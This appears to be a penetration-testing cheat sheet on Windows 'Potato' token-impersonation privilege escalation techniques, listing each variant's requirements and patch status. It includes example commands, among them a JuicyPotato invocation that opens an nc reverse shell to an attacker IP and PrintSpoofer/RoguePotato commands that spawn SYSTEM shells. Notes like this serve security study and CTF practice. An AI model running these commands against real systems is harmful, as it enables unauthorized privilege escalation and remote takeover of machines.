
**Potato Attacks** are a family of windows privilege escalation techniques that abuse **impersonation tokens** and **misconfigured services**. These attacks typically escalates a **low-privileged user** to **SYSTEM** by tricking privileged services into running attacker controlled payloads.


### What is Token Impersonation

windows allows services with certain privileges (like ``SeImpersonatePrivilege``) to impersonate tokens of other users. if an attacker can trick a privileged service into impersonating them, they can **capture that tokem** and **spawn a privileged process**


#### Token Impersonation Flow:

1.  Trigger a privileged Service or COM object
2.  Force or wait for impersonation.
3.  Hijack the impersonated token.
4.  Execute a payload (e.g. shell) as SYSTEM

---

### Hot Potato (Legacy NTLM Relay Exploit)(tater.exe)

*   [Foxglove origina article](https://foxglovesecurity.com/2016/01/16/hot-potato/)
*   [J. lajara's Guide](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
*   [PentestLab](https://pentestlab.blog/2017/04/13/hot-potato/)

bot potato

####    Requirements

*   Windows 7/8/Server 2008-12
*   ``SeImpersonatePrivilege`` or  ``SeAssignPrimaryTokenPrivilege``
*   SYSTEM service using **``NTLM``**


#### Technique

combines **NBNS spoofing, NTLM relay** and **token impersonation** to hijack a privileged token

**Note: Depricated in modern windows**

---

### Rotten Potato (Named Pipe/ DCOM Abuse)

####    Requirements

*   ``SeImpersonatePrivilege``
*   SYSTEM COM Server(e.g. BITS)

**Note: Patched in Windows 10 1709+. Still works on older system**

---


### Juicy Potato (Standalone COM Token Hijack)

[GitHub](https://github.com/ohpe/juicy-potato/releases)
[HTB Jeeves](https://www.hackthebox.com/machines/jeeves)

####    Requirements

*   ``SeImpersonatePrivilege``
*   Pre-Windows 10 1809 /Server 2019
*   Vulnerable CLSID

#### Example

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\system32\nc64.exe -e cmd.exe 192.168.28.218 4433" -t *
```

* ``-l 1337`` : Bind port
*   ``-p`` : Payload executable (cmd.exe)
*   ``-a`` : Arguments (nc reverse shell to your kali) 
* ``-t *`` :    Token Type (auto)

---

### Rogue Potato (SMB Capture)

####    Requirements

*   ``SeImpersonatePrivilege``
*   Works on Windows 10 1809+


#### Example

```cmd
RoguePotato.exe -e "cmd.exe" -l 9999
```

---

### PrintSpoofer (Spooler Exploit)


####    Requirements

*   ``SeImpersonatePrivilege``
*   Spooler service running


#### Example

```cmd
PrintSpoofer.exe -i -c cmd
```

**Note: Patched by Microsoft(2021) Effective on older builds**

---


### SweetPotato


####    Requirements

*   ``SeImpersonatePrivilege``
*   Print Spooler enabled

**Note: Slightly more stable than PrintSpoofer. COM-based**


